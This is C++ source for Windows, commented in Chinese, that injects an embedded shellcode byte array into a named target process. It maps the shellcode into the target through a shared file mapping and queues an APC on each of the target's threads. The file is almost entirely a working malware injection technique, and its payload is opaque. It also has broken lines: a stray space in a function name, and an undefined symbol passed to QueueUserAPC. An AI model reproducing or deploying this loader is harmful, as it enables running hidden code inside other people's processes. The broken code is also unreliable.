#include <windows.h>
#include <iostream>
#include <Tlhelp32.h>
#include <vector>
#pragma comment (lib, "OneCore.lib")	//MapViewOfFile2函数依赖这个静态链接库
using namespace std;

unsigned char shellcode[] = 
"\xbb\x8f\x8f\xc9\xdb\xdb\xc2\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x59\x31\x58\x14\x83\xc0\x04\x03\x58\x10\x6d\x7a\x35\x33\xfe"
"\x85\xc6\xc4\x60\xb7\x14\xa0\xeb\xe5\xa8\xa0\x0e\x82\x9b\xbe"
"\x5b\xc7\x0f\x34\x29\xc0\x1e\xb5\xc2\xa7\x2b\x6f\xed\x07\x07"
"\x53\x6c\xf4\x5a\x80\x4e\xc5\x94\xd5\x8f\x02\x63\x93\x60\xde"
"\x23\xd0\x2c\xcf\x40\xa4\xec\xee\x86\xa2\x4c\x89\xa3\x75\x38"
"\x25\xad\xa5\x4b\xfd\xb5\xce\x13\xde\xc4\x03\xf3\x9b\x0e\xd7"
"\xcf\xea\x1b\x2c\xa4\xdc\xe4\x4c\x6c\x2f\xdb\x8e\x5f\x5d\x77"
"\x11\x98\x66\x67\x67\xd2\x94\x1a\x70\x21\xe6\xc0\xf5\xb5\x40"
"\x82\xae\x11\x70\x47\x28\xd2\x7e\x2c\x3e\xbc\x62\xb3\x93\xb7"
"\x9f\x38\x12\x17\x16\x7a\x31\xb3\x72\xd8\x58\xe2\xde\x8f\x65"
"\xf4\x87\x70\xc0\x7f\x25\x66\x74\x80\xb5\x87\x28\x16\x79\x4a"
"\xd3\xe6\x15\xdd\xa0\xd4\xba\x75\x2f\x54\x32\x50\xa8\xed\x54"
"\x63\x66\x55\x34\x9d\x87\xa5\x1c\x5a\xd3\xf5\x36\x4b\x5c\x9e"
"\xc6\x74\x89\x0a\xcd\xe2\x9e\xda\xea\x77\xb6\xd8\x0c\x7c\x95"
"\x55\xea\x2c\x49\x35\xa3\x8c\x39\xf5\x13\x65\x50\xfa\x4c\x95"
"\x5b\xd1\xe4\x3c\xb4\x8f\x5d\xa9\x2d\x8a\x16\x48\xb1\x01\x53"
"\x4a\x39\xa3\xa3\x05\xca\xc6\xb7\x72\xad\x28\x48\x83\x58\x28"
"\x22\x87\xca\x7f\xda\x85\x2b\xb7\x45\x75\x1e\xc4\x82\x89\xdf"
"\xfc\xf9\xbc\x75\x40\x96\xc0\x99\x40\x66\x97\xf3\x40\x0e\x4f"
"\xa0\x13\x2b\x90\x7d\x00\xe0\x05\x7e\x70\x54\x8d\x16\x7e\x83"
"\xf9\xb8\x81\xe6\x79\xbe\x7d\x74\x56\x67\x15\x86\xe6\x97\xe5"
"\xec\xe6\xc7\x8d\xfb\xc9\xe8\x7d\x03\xc0\xa0\x15\x8e\x85\x03"
"\x84\x8f\x8f\xc2\x18\x8f\x3c\xdf\xab\xea\x4d\xe0\x4c\x0b\x44"
"\x85\x4d\x0b\x68\xbb\x72\xdd\x51\xc9\xb5\xdd\xe5\xc2\x80\x40"
"\x4f\x49\xea\xd7\x8f\x58";

DWORD GetProcessPid(char *ProcessName);
std::vector<DWORD> GetThreadTid(DWORD Pid);


int main(int argc, char* arg[])
{
	// 1. get target process
	DWORD Pid = GetProcessPid(arg[1]);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

	// 1. 创建空的文件映像
    HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);// 创建一个file Mapping, 好像是空的, 返回文件映射对象句柄
	// 2. 创建file view
    LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode)); //创建文件视图. 要将数据从文件映射到进程的虚拟内存，必须创建文件的视图. 返回指向文件视图的指针, 相当于VirturallAlloc分配的空间
	// 3. 往被映射的虚拟地址写入shellcode
    memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));  // 将shellcode写入刚刚创建的空的文件视图
    // 4. 将mapping映射到被注入进程的虚拟地址, 也是通过file view
	LPVOID lpMapAddressRemote = M apViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);   // 将文件的节的视图映射到指定进程的地址空间.

	// 4. find all threads belong to target process.
	std::vector<DWORD> ThreadTids = GetThreadTid(Pid);

	//5. Inject APC into all threads of target process
	for (DWORD threadId : ThreadTids) // 将所有的线程都插入APC调用.
	{
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)AllocMemory, hThread, NULL);	// 类似 CreateRemoteThread, 入口放在存shellcode的内存地址.
		// Sleep(10 * 2); 这个并不能让线程进入Alert状态, 要在shellcode里写这个让目标Thread执行才行. 同理 NtTestAlert
		cout << threadId << "APC injection successful" << endl;
		CloseHandle(hThread);
	}
	CloseHandle(hProcess);
	return 0;
}

DWORD GetProcessPid(char *ProcessName)
{
	HANDLE hProcessSnap = NULL;   //define snapshot
	DWORD ProcessID = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   //create snapshot of all process in system
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!strcmp(ProcessName, pe32.szExeFile))
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	CloseHandle(hProcessSnap);
	return ProcessID;
}

std::vector<DWORD> GetThreadTid(DWORD Pid)
{
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);  // 线程快照
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	SIZE_T shellSize = sizeof(shellcode);
	HANDLE threadHandle = NULL;
	if (Thread32First(hThreadSnap, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == Pid) {
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(hThreadSnap, &threadEntry));
	}
	return threadIds;
}

